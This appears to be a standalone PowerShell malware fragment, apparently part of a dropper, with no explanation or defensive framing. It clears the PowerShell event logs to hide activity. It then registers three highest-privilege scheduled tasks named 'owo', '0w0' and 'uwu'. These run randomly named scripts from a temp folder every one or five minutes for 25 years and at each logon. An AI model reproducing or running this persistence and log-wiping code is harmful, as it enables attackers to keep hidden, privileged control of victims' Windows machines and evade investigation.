$n = $(randomstr)[1]; $n2 = $(randomstr)[1]; function New-TemporaryDirectory { $parent = [System.IO.Path]::GetTempPath(); [string]$name = [System.Guid]::NewGuid(); $newdir = New-Item -ItemType Directory -Path (Join-Path $parent $name); return $newdir.Name; }; $dOne = New-TemporaryDirectory; Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"; Clear-EventLog "Windows Powershell";
$action = New-ScheduledTaskAction -Execute "$pshome\powershell.exe" -Argument "$env:temp\$dOne\$n.ps1;"; $repeat = (New-TimeSpan -Minutes 5); $repeat2 = (New-TimeSpan -Minutes 1); $dt = ([datetime]::Now); $duration = $dt.AddYears(25) - $dt; $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat -RepetitionDuration $duration; $trigger3 = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat2 -RepetitionDuration $duration;
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd; Register-ScheduledTask -TaskName "owo" -Action $action -Trigger $trigger -RunLevel Highest -Settings $settings; Start-ScheduledTask -TaskName "owo";
$action2 = New-ScheduledTaskAction -Execute "$pshome\powershell.exe" -Argument "$env:temp\$dOne\$n2.ps1;"; Register-ScheduledTask -TaskName "0w0" -Action $action2 -Trigger $trigger3 -RunLevel Highest -Settings $settings; Start-ScheduledTask -TaskName "0w0"; $trigger2 = New-ScheduledTaskTrigger -AtLogon; Register-ScheduledTask -TaskName "uwu" -Action $action -Trigger $trigger2 -RunLevel Highest -Settings $settings; Start-ScheduledTask -TaskName "uwu";
